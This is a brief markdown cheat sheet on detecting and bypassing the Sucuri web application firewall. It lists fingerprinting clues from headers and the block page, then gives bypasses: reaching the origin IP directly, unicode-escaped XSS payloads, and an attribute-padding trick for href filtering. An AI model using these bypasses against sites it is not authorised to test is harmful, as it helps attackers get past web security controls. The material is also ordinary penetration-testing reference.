# Securi WAF

## Detection

- Detectability: Easy
Detection Methodology:
- Response headers may contain Sucuri or Cloudproxy keywords.
- Blocked response page contains the following text snippet:
- Access Denied - Sucuri Website Firewall text.
- Reference to https://sucuri.net/privacy-policy URL.
- Sometimes the email cloudproxy@sucuri.net.
- Contains copyright notice ;copy {year} Sucuri Inc.
- Response headers contains X-Sucuri-ID header along with normal requests.

---

## Bypasses

1. If you can get the IP it will totally bypass the WAF!

2. print, confirm, alert are blacklisted. A workaround can be using unicode. 

  prompt
  ```js
  \u0070rompt(1)
  eval(\u0070rompt(1))
  ```
  
  alert
  ```js
  \u0061lert(0)
  eval(\u0061lert(0))
  ```
  
  ![carbon](https://user-images.githubusercontent.com/94630001/162410201-4e9d2c42-ede6-4c98-b384-76abdf437476.png)


  href
  ```
  # Blocked
  <a href="hello">

  # Bypass 

  <a fooooooooooooooooooooooo href="hello">
  ```

![image](https://user-images.githubusercontent.com/94630001/162407183-fb7e290d-2ade-4053-a519-1e4781d631f7.png)


## Help 

https://github.com/0xInfection/Awesome-WAF  
https://github.com/vincentcox/bypass-firewalls-by-DNS-history  


